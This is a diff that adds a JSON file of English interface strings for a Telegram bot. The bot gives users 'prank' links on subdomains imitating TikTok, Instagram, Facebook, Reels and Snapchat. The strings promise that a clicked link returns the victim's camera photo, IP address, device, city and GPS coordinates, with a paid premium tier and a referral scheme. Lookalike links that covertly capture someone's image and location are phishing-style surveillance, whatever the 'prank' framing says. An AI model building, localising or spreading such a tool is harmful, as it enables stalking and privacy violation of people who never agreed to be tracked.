@@ -1,0 +1,40 @@
+{
+    "subscription": "⛔️ <b>To continue using the bot, please subscribe to the channel.</b>\n\n🔜 <b>After subscribing to all channels, send the command:</b> /start",
+    "start": {
+        "text": "🎉 <b>Here are your prank links for friends:</b>\n\n➖ <b>TikTok:</b> https://tiktok.fearby.su/?video={{userToken}}{{mode}}\n\n➖ <b>Instagram:</b> https://instagram.fearby.su/?video={{userToken}}{{mode}}\n\n➖ <b>Facebook:</b> https://facebook.fearby.su/?video={{userToken}}{{mode}}\n\n➖ <b>Reels:</b> https://reels.fearby.su/?video={{userToken}}{{mode}}\n\n➖ <b>Snapchat:</b> https://snapchat.fearby.su/?video={{userToken}}{{mode}}\n\n📸 <b>Once your friend clicks on the link — you will receive their photo!</b>\n\n{{cameraText}}",
+        "keyboard": {
+            "getPremium": "🏆 Premium Subscription",
+            "privacy": "🎭 Privacy",
+            "sharelink": "🔗 Send to Friend",
+            "changeCamera": "📟 Change Camera"
+        },
+        "frontCamera": "📟 <b>The bot will take a photo with the front camera</b>",
+        "rearCamera": "📟 <b>The bot will take a photo with the rear camera</b>"
+    },
+    "commandNotFound": "❗️Command not found.",
+    "back": "◀️ Back",
+    "privacy": "🎭 <b>Privacy.</b>\n\n1) The bot is intended solely for pranks, education, or experimentation.\n2) Sharing the link with strangers is not allowed — it may lead to a ban.\n3) The bot and its associated website only store minimal user information: their ID, language, and Premium subscription status.\n4) The bot does not store users' photos: they are transmitted through the website to a temporary file and immediately sent to the final recipient.\n5) It is strictly prohibited to share the link with requests that violate Telegram rules or the laws of your country (or any other country with civilized legislation).\n6) A complaint system is implemented in the bot: if the received photo violates the rules, it can be sent for review, and upon confirmation of the violation, the sender's IP will be banned.\n7) The bot is created for friendly pranks and light jokes, not for hacking or revealing identities. Please respect other users and their personal space.\n\n<b>By using the bot, you agree to these rules. Non-compliance may lead to a ban.</b>",
+    "newPhoto": "❗️<b>Photo received via your link.</b>\n\n🌐 <b>IP:</b> <code>{{ip}}</code>\n📱 <b>Device:</b> <code>{{platform}}</code>\n🌃 <b>City:</b> <code>{{location}}</code>\n📍 <b>Coordinates:</b> <code>{{coordinates}}</code>\n\n{{premium}}",
+    "complaint": "⛔️ Complain",
+    "complaintSent": "☑️ Complaint successfully sent!",
+    "paymentSent": "🎉 <b>Payment received successfully!</b>",
+    "hide": "hidden",
+    "premiumSuccess": "🏆 <b>Premium users will unlock all hidden information and more.</b>",
+    "premium": {
+        "text": "🏆 <b>Premium Benefits!</b>\n\n1) Choice of camera for the photo. (front or rear)\n2) Detailed information in the message (those that are hidden)\n3) No restrictions\n\n🔑 <i>The subscription is paid for 24 hours.</i>",
+        "keyboard": {
+            "pay": "⭐ Pay for Subscription",
+            "getForFree": "👥 Get for Free"
+        }
+    },
+    "referral": {
+        "text": "👥 <b>Referral Cabinet.</b>\n\n  • <b>Total Invited:</b> <code>{{invitesCounter}}</code>\n  • <b>Points:</b> <code>{{points}}</code>\n\n🔗 <b>Your link:</b> <code>https://t.me/{{BOTNAME}}?start={{tgId}}</code>\n\n👉 Invite friends and earn points that can later be exchanged for a premium subscription.\n\n<b>Once you invite 10 friends, you can exchange points for a premium subscription.</b>",
+        "keyboard": {
+            "exchange": "♻️ Exchange for Subscription"
+        }
+    },
+    "exchange": {
+        "text": "🎊 <b>You have successfully exchanged points for 24 hours of subscription!</b>",
+        "enoughtPoints": "😢 Not enough points. Invite more friends!"
+    }
+}
